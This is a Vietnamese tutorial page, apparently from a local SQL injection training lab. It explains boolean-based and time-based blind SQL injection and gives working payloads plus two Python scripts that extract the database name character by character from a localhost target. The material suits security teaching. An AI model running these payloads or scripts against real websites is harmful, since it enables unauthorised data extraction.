<main class="main" role="main">
    <div class="content">
        <article id="post-sqli_tancong_blind" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    [SQLI] Kỹ Thuật Tấn Công Blind SQL Injection (Tấn công dạng mù)
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
                    <?php if($src_youtube != ''){echo '<button id="introduce-btn"><img src="public/images/play-circle.png" class="img-circle img-rotate" style="height: 24px; width: 24px; margin-right: 5px" " />Hướng Dẫn</button>';} ?>
                </div>
            </div>
            <?php echo get_iframe_youtube($src_youtube); ?>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Tai-sao-lai-goi-la-tan-cong-mu"><a href="#Tai-sao-lai-goi-la-tan-cong-mu" class="headerlink" title="Tại sao lại gọi là tấn công mù?"></a>Tại sao lại gọi là tấn công mù?</h1>
                <p>Trong các trường hợp, ứng dụng website không có hiển thị ra các kết quả mà câu lệnh query đã chạy một cách trực quan lên giao diện website.<br>Nhưng câu truy vấn vẫn được thực thi, đồng thời nó cũng có nguy cơ bị dính SQL Injection.<br>Trong trường hợp đó, ta sẽ sử dụng kỹ thuật tấn công dạng mù (Blind SQL Injection)</p>
                <p>Ví dụ trực quan như sau:</p>
                <blockquote>
                    <p>SELECT * FROM product WHERE id='$USER_INPUT_ID' LIMIT 1</p>
                </blockquote>
                <p>Nếu database tồn tại sản phẩm có mã ID đó, hiển thị: “Sản phẩm tồn tại trong database!”.<br>Nếu ngược lại không có kết quả thì hiển thị: “Sản phẩm không tồn tại”.</p>
                <p>Vậy các cột kết qủa câu truy vấn <strong>không được</strong> hiển thị ra website như ID, Tên Sản Phẩm.Do đó,dù ta có truy vấn thế nào,cũng không thể thấy được kết quả.<br>Khi đó, kỹ thuật <strong>Blind SQL Injection</strong> sẽ được sử dụng.</p>
                <h1 id="Phan-loai"><a href="#Phan-loai" class="headerlink" title="Phân loại"></a>Phân loại</h1>
                <p>Có hai dạng:</p>
                <ul>
                    <li><strong>Boolean Based Blind:</strong> Dựa vào tính đúng sai của câu truy vấn.</li>
                    <li><strong>Time Based Blind:</strong> Dựa vào thời gian thực thi của câu truy vấn.</li>
                </ul>
                <p>Ta lần lượt tìm hiểu về hai dạng này.</p>
                <h1 id="Boolean-Based-Blind"><a href="#Boolean-Based-Blind" class="headerlink" title="Boolean Based Blind"></a>Boolean Based Blind</h1>
                <p>Ý tưởng của dạng tấn công này là sẽ dùng kết quả đúng sai của câu truy vấn để xác định điều kẻ tấn công phán đoán có chính xác hay không rồi từ đó khai thác ra được dữ liệu trong CSDL.</p>
                <h2 id="Vi-du"><a href="#Vi-du" class="headerlink" title="Ví dụ"></a>Ví dụ</h2>
                <p>Lấy ví dụ như trên. Ta thêm vào câu truy vấn với ID như sau:</p>
                <blockquote>
                    <p>1' AND 1=1 -- #</p>
                </blockquote>
                <p>Kết quả sẽ trả về là “Sản phẩm tồn tại”. Tại sao lại như vậy:</p>
                <ul>
                    <li>Câu truy vấn phía trước, kẻ tấn công cung cấp ID hợp lệ thì câu truy vấn sẽ đúng và có kết quả. Tương đương với True.</li>
                    <li>Câu truy vấn phía sau 1=1 là đúng. Nên kết quả của nó cũng là True.</li>
                </ul>
                <p>=&gt; Vậy True AND True = True.</p>
                <p>Vậy nếu ta cung cấp ID là:</p>
                <blockquote>
                    <p>1' AND 1=0 -- #</p>
                </blockquote>
                <p>Thì kết quả sẽ ngược lại (True and False = False).<br>Vậy ta có thể dựa vào kết quả trả về và đoán ra rằng kết quả của vế sau sẽ là đúng hay sai.<br>Giờ ta thay ID:</p>
                <blockquote>
                    <p>1' AND SUBSTR(database(),1,1)='v' --#</p>
                </blockquote>
                <ul>
                    <li><strong>SUBSTR</strong> là hàm để cắt chuỗi, tại vị trí số 1 và cắt đi 1 kí tự. Có thể sử dụng thêm hàm <strong>ASCII</strong> để covert sang số DEC của kí tự đó nếu cần thiết.</li>
                </ul>
                <p>Ta có thể dựa vào:</p>
                <ul>
                    <li>Kết quả câu truy vấn với ID=1 là đúng.</li>
                    <li>Nếu SUBSTR() kí tự đầu tiên của database là ‘A’ thì vế này sẽ cho True, nếu sai thì là False.</li>
                </ul>
                <p>=&gt; Vậy nếu kết quả là câu truy vấn là đúng thì ta biết được đó là do <strong>True AND True</strong> còn ngược lại là <strong>True And False</strong><br>=&gt; Vậy đoán được kết quả của vế sau rồi, ta có thể từ từ mà đoán ra được hết các kí tự còn lại đúng không nào?</p>
                <p>Thông thường, người ta xây dựng công cụ để tấn công dạng này. Vì nó phải thực hiện rất nhiều phép thử (brute force).</p>
                <h2 id="Tan-cong-bang-Python-requests-Boolen-based-blind"><a href="#Tan-cong-bang-Python-requests-Boolen-based-blind" class="headerlink" title="Tấn công bằng Python requests + Boolen based blind."></a>Tấn công bằng Python requests + Boolen based blind.</h2>
                <h3 id="Y-tuong"><a href="#Y-tuong" class="headerlink" title="Ý tưởng"></a>Ý tưởng</h3>
                <p>Có nhiều thư viện của Python cho phép thực hiện HTTP Requests, requests là một thư viện rất mạnh và dễ dàng sử dụng trong đó.<br>Cài đặt: <a href="http://docs.python-requests.org/en/master/user/install/" target="_blank" rel="noopener">http://docs.python-requests.org/en/master/user/install/</a><br>Mục tiêu: Tên của CSDL hiện tại.<br>Ý tưởng:<br>PAYLOAD sẽ có dạng:</p>
                <blockquote>
                    <p>1' AND SUBSTR(database(),VỊTRÍCỦAKÍTỰ,1) = KÍTỰTAĐOÁN --#</p>
                </blockquote>
                <p>Ta sẽ cho VỊTRÍCỦAKÍTỰ chạy từ 1 -&gt; 100, hoặc dùng LENGTH() để kiểm tra trước độ dài của database().<br>KÍTỰTAĐOÁN chạy trong bảng ASCII.<br>Rồi xem kết quả trả về, nếu kết quả có chứa “Sản phẩm tồn tại trong database” thì ta chuyển sang VỊTRÍ tiếp theo, rồi cộng CHARACTER đó vào kết quả tên CSDL của chúng ta.</p>
                <h3 id="Code"><a href="#Code" class="headerlink" title="Code:"></a>Code:</h3>
                <figure class="highlight python">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">"utf-8"</span>) <span class="comment">#Cho phép nhận kết quả và hiển thị utf-8.</span></span><br><span class="line">tendb = <span class="string">''</span></span><br><span class="line">URL = <span class="string">"http://localhost/final/index.php?page=sqli_tancong_blind&amp;submit=ok&amp;id="</span></span><br><span class="line"><span class="keyword">for</span> vitri <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">print</span> vitri</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> string.printable: <span class="comment"># Cho chạy trong list kí tự có thể in được.</span></span><br><span class="line">		payload = <span class="string">"1' AND SUBSTR(database(),"</span>+ str(vitri) +<span class="string">",1)='"</span>+char+<span class="string">"'-- -"</span></span><br><span class="line">		URL_REAL = URL + payload</span><br><span class="line">		rs = requests.get(URL_REAL)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'Sản phẩm có trong database!'</span> <span class="keyword">in</span> rs.text:</span><br><span class="line">			tendb += char</span><br><span class="line">			<span class="keyword">print</span> tendb</span><br><span class="line">			<span class="keyword">break</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <h1 id="Time-Based-Blind"><a href="#Time-Based-Blind" class="headerlink" title="Time Based Blind"></a>Time Based Blind</h1>
                <p>Ở dạng Boolean based thì vẫn có thể dựa vào kết quả hiển thị ra như “Không có” hay “Có” để nhận biết tính đúng sai của câu truy vấn. Nhưng nếu trong trường hợp website chỉ truy vấn và cũng không hiện ra kết quả như “Có” hay “Không” luôn. Trên website không có gì liên quan đến câu truy vấn đó cả. Nhưng nó vẫn được thực thi và bị lỗ hổng SQL Injection.<br>Lúc này là lúc cần thiết đến sử dụng <strong>Time Based SQL Injection</strong>.</p>
                <p>Ý tưởng của dạng tấn công này là dùng các hàm làm chậm quá trình thực thi và trả về của câu query như hàm <strong>SLEEP()</strong> và hàm <strong>BENCHMARK()</strong> ở MySQL để kiểm tra tính đúng sai của câu truy vấn.</p>
                <ul>
                    <li>Nếu điều kiện ta đưa ra là đúng,thì cho SLEEP(5)</li>
                    <li>Nếu điều kiện ta đưa ra là sai, thì trả về ngay.<br>=&gt; Sau đó,ta dựa vào thời gian trả về này để biết được điều kiện ta đưa ra đúng hay sai.</li>
                </ul>
                <p>Sử dụng ví dụ ở trên, thử với payload sau:</p>
                <blockquote>
                    <p>1' AND SLEEP(5) -- #</p>
                </blockquote>
                <p>Kết quả trả về sẽ chậm đi 5 giây.<br>Khi kết hợp với IF để truy vấn CSDL:</p>
                <blockquote>
                    <p>1' AND IF(SUBSTR(database(),1,1)='v', SLEEP(5), 1) -- #      &lt;= Tức là nếu đúng SUBSTR của database tại vị trí đầu tiên là v thì sẽ sleep 5s.</p>
                </blockquote>
                <p>•    Cấu trúc hàm IF(condition, when_true, when_false).<br>Tương tự với <strong>Boolean Based Blind</strong>, cùng xây dựng tool python tấn công nào.</p>
                <h2 id="Tan-cong-bang-Python-requests-Time-based-blind"><a href="#Tan-cong-bang-Python-requests-Time-based-blind" class="headerlink" title="Tấn công bằng Python requests + Time based blind"></a>Tấn công bằng Python requests + Time based blind</h2>
                <h3 id="Y-tuong-1"><a href="#Y-tuong-1" class="headerlink" title="Ý tưởng:"></a>Ý tưởng:</h3>
                <p>Payload sẽ có dạng:</p>
                <blockquote>
                    <p>1' AND IF(SUBSTR(database(),VỊTRÍKÍTỰ,1)=KÍTỰTAĐOÁN, SLEEP(1), 1) -- #</p>
                </blockquote>
                <p>VỊTRÍ và CHARACTER tương tự như ví dụ phía trước.<br>Xây dựng thêm chức năng đêm thời gian server trả về.<br>Nếu thời gian trả về lớn hơn 1s,thì tức là VỊ TRÍ đó của database() là CHARACTER.<br>Nếu thời gian trả về bình thường,thì thử tiếp các CHARACTER tiếp theo.</p>
                <h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3>
                <figure class="highlight plain">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding("utf-8")</span><br><span class="line"></span><br><span class="line">def getTimeResponse(URL): #Truyền vào 1 URL, nó sẽ tạo request tới và trả lại thời gian hoàn thành!</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    resp = requests.get(URL)</span><br><span class="line">    return (time.time()-start_time)</span><br><span class="line">tendb = ''</span><br><span class="line">URL = "http://localhost/final/index.php?page=sqli_tancong_blind&amp;submit=ok&amp;id="</span><br><span class="line">for vitri in range(1,100):</span><br><span class="line">	for char in string.printable:</span><br><span class="line">		#Sửa lại chút payload</span><br><span class="line">		payload = "1' AND IF(SUBSTR(database(),"+ str(vitri) +",1)='"+char+"',SLEEP(1),1) -- -"</span><br><span class="line">		URL_REAL = URL + payload</span><br><span class="line">		res_time = getTimeResponse(URL_REAL)</span><br><span class="line">		if res_time &gt; 1:</span><br><span class="line">			tendb += char</span><br><span class="line">			print tendb</span><br><span class="line">			break</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
            </div>
        </article>
    </div>
    <?php if(isset($_GET['change_status'])){if($_GET['change_status'] == 1){change_status($id_post);}} echo print_footer_status($id_post,$title); ?>
</main>



